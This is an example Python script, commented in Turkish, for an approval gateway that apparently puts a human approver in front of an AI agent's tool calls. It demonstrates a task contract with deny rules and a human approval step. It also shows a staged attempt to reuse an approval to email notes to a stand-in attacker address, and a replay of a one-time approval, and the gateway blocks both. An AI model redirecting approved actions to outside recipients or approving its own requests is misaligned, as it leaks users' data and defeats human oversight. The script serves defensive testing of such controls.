"""Ajan Kalkanı insan onayı akışı: yalnızca standart kütüphane kullanan uçtan uca örnek.

Çalıştırmadan önce sunucuyu onaylayıcı jetonuyla başlatın:

    $env:AJAN_KALKANI_APPROVER_TOKEN = python -c "import secrets; print(secrets.token_urlsafe(32))"
    python -m ajan_kalkani

Sonra aynı terminalde: python examples/approval_flow.py

Bu örnek, gösterim için hem ajanı hem onaylayıcıyı oynar. Gerçek kurulumda
onaylayıcı jetonu ajanın ortamında bulunmamalıdır; aksi hâlde ajan kendi
isteğini onaylayabilir.
"""

from __future__ import annotations

import json
import os
from urllib.error import HTTPError
from urllib.request import Request, urlopen


BASE_URL = os.getenv("AJAN_KALKANI_URL", "http://127.0.0.1:8000")
APPROVER_TOKEN = os.environ["AJAN_KALKANI_APPROVER_TOKEN"]


def call_api(method: str, path: str, payload: dict | None = None, token: str | None = None) -> dict:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = Request(
        f"{BASE_URL}{path}",
        data=json.dumps(payload).encode("utf-8") if payload is not None else None,
        headers=headers,
        method=method,
    )
    try:
        with urlopen(request, timeout=5) as response:
            return json.load(response)
    except HTTPError as error:
        raise SystemExit(f"{method} {path} → {error.code}: {error.read().decode('utf-8')}") from error


def authorize(session_id: str, call: dict, approval_id: str | None = None) -> dict:
    body: dict = {"call": call}
    if approval_id:
        body["approval_id"] = approval_id
    return call_api("POST", f"/api/gateway/sessions/{session_id}/authorize", body)


def show(step: str, record: dict) -> None:
    decision = record["decision"]
    verdict = "İZİN" if decision["allowed"] else "ENGEL"
    print(f"{step:<42} {verdict:<6} {decision['rule_id']}")


session = call_api(
    "POST",
    "/api/gateway/sessions",
    {
        "name": "Notları gönderen ajan",
        "ttl_minutes": 30,
        "contract": {
            "task": "Toplantı notlarını Ayşe'ye gönder",
            "allow": ["email.read_latest"],
            "deny": ["file.*", "webhook.*"],
            "approval_required": ["email.send"],
        },
    },
)
send_to_ayse = {
    "tool": "email.send",
    "arguments": {"to": "ayse@example.test", "subject": "Toplantı notları", "body": "Notlar ekte."},
    "origin": "my-agent",
}
send_to_attacker = {
    **send_to_ayse,
    "arguments": {**send_to_ayse["arguments"], "to": "notes@attacker.example"},
}

# 1. Ajan sorar: onay gerekiyor, gateway bir onay isteği açar.
requested = authorize(session["id"], send_to_ayse)
show("1. Ajan e-posta göndermek istiyor", requested)
approval_id = requested["approval"]["id"]

# 2. Onaylayıcı (ayrı kimlik) kuyruğu görür ve onaylar.
queue = call_api("GET", "/api/gateway/approvals", token=APPROVER_TOKEN)
preview = next(item for item in queue if item["id"] == approval_id)["arguments_preview"]
print(f"{'2. Onaylayıcı inceliyor':<42} alıcı: {preview['to']}")
call_api(
    "POST",
    f"/api/gateway/approvals/{approval_id}/decision",
    {"approved": True, "note": "Alıcı ve içerik doğru."},
    token=APPROVER_TOKEN,
)

# 3. Ajan onayı alıcıyı değiştirerek kullanmaya çalışır: reddedilir.
show("3. Aynı onayla saldırgana gönderim", authorize(session["id"], send_to_attacker, approval_id))

# 4. Ajan birebir aynı çağrıyı onayla gönderir: bir kez izin verilir.
show("4. Onaylanan çağrı", authorize(session["id"], send_to_ayse, approval_id))

# 5. Aynı onay ikinci kez: tek kullanımlık olduğu için reddedilir.
show("5. Aynı onayın tekrar kullanımı", authorize(session["id"], send_to_ayse, approval_id))
